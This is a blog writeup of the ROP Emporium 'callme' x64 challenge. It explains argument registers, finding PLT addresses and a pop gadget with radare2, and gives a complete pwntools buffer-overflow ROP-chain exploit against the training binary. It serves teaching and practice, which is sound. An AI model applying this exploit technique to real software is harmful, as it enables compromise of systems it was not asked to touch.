---
layout: post
title:  "ROP Emporium callme Writeup (x64)"
date:   2024-06-02 00:00:00 -0400
categories: rop-emporium challenge-3
tags: rop-emporium callme x64 writeup buffer-overflow rop reverse-engineering 64-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[third challenge](https://ropemporium.com/challenge/callme.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/callme.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call the functions `callme_one()`,
`callme_two()`, and `callme_three()` in that order with
the arguments `0xdeadbeefdeadbeef`, 
`0xcafebabecafebabe`, and `0xd00df00dd00df00d`.

We should essentially be running
```c
callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
```

### x64 Calling Convention
We know from the first challenge we need to set the
instruction pointer to a function address in order to
call that function. But how do we pass arguments to
those functions?

In `x64` arguments are passed through specific registers.
The first three arguments correspond to the `rdi`, `rsi`,
and `rdx` registers respectively. 
[This x64 cheat sheet](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf){:target="_blank"}{:rel="noopener noreferrer"}
can help if you want to learn more about `x64`.

## Exploit Crafting
The offset for `x64` challenges will be `40 bytes`. If
you want to know how to get this value see the
[ret2win writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

### Function Address
> What are the plt addresses of the functions?
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. To list functions with their
addresses we can run `afl`
![func-addr](/images/callme/x64-addr.png)

The function addresses we need are
```
callme_one: 0x00400720
callme_two: 0x00400740
callme_three: 0x004006f0
```

Why are we using the `plt` entries for the functions
rather than the calls in `usefulFunction`? When
a `call` instruction is executed, it'll execute the
function while also placing the return address onto
the stack! So once `callme_one()` is finished it
will continue to execute instructions in `usefulFunction`

![call-problem](/images/callme/x64-call-problem.png)

So after we finish `callme_one()`, the program
will exit!


### Adding Arguments
> Is there a gadget which sets the argument registers?
{: .prompt-tip }
Let's take a look at `usefulFunction` in `radare2`
```
s sym.usefulFunction
V
p
```

![useful-asm](/images/callme/x64-useful-asm.png)

There's a helpful section called `usefulGadgets` with,
who would've thought, a useful gadget! It sets the 
first three `x64` argument registers from the stack,
which we already control! The address of this
gadget is `0x0040093c`

## Exploit
Now we have everything we need to build the exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
call1_addr = 0x00400720
call2_addr = 0x00400740
call3_addr = 0x004006f0
pop_regs_addr = 0x0040093c

# put args into corresponding registers
def set_args(args):
    payload = p64(pop_regs_addr)
    for a in args:
        payload += p64(a)
    return payload

# create payload
payload = b'A' * 40

# callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
args = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]
payload += set_args(args)
payload += p64(call1_addr)

# callme_two
payload += set_args(args)
payload += p64(call2_addr)

# callme_three
payload += set_args(args)
payload += p64(call3_addr)

# send payload + receive flag
io = process('./callme')
io.sendline(payload)
io.recvuntil(b'callme_two() called correctly\n')
flag = io.recvline()
log.success(flag)
```
![flag](/images/callme/x64-flag.png)

## Conclusion
This challenge reinforces the the concept of passing
multiple arguments in `x64`, as well as finding
and chaining gadgets together.

[Previous Challenge (split)]({% post_url 2024-06-01-rop-emporium-split-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[Next Challenge (write4)]({% post_url 2024-06-03-rop-emporium-write4-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}

[callme x86]({% post_url 2024-06-02-rop-emporium-callme-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
